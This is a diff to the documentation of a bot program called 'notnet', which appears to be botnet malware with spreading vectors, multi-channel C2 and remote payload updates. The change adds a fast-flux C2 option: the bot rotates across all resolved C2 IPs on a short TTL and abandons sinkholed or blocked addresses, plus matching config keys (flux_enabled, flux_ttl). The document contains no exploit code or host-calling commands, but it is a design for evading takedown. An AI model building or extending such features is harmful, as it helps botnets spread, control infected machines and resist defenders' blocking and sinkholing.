@@ -41,6 +41,12 @@ repository build system. Do not treat them as available targets.
   rejected (fail-closed).
 - All three channels support TLS 1.2+ when built with `make TLS=1` and a
   certificate pin is configured (see Encryption).
+- All three channels support **fast-flux C2** (`flux_enabled=1`): the bot
+  resolves every A record of each C2 hostname, rotates the active IP every
+  `flux_ttl` seconds (default 60), re-resolves at the same low TTL, and fails
+  over to the next IP automatically on connect or recv timeout — a
+  sinkholed or blocked IP is abandoned on the next attempt. Disabled by
+  default (single hostname resolution, as before).
 
 ## Spreading Vectors
 
@@ -136,6 +142,8 @@ The bot loads config from `/etc/notnet.conf` (key=value format):
 || `ws_port` | `443` | WebSocket C2 port |
 || `ws_path` | `/ws/v1/bot` | WebSocket C2 path |
 || `ws_enabled` | auto | 0/1 — explicitly enable/disable WS C2 |
+|| `flux_enabled` | `0` | 0/1 — fast-flux C2: resolve all A records of each C2 hostname, rotate the active IP every `flux_ttl` seconds, fail over to the next IP on connect/recv timeout |
+|| `flux_ttl` | `60` | Seconds between flux re-resolution + IP rotation (1–3600) |
 || `c2_secret` | *(none)* | Shared secret echoed by C2; HTTP/WS commands are rejected without it (or `NOTNET_C2_SECRET` env var) |
 || `tls_cert_pin_sha256` | *(none)* | TLS server cert fingerprint pin; requires `make TLS=1` (or `NOTNET_TLS_CERT_PIN_SHA256` env var) |
 || `payload_sha256` | *(none)* | Expected SHA-256 of downloaded payload; update is refused without a match (or `NOTNET_PAYLOAD_SHA256` env var) |
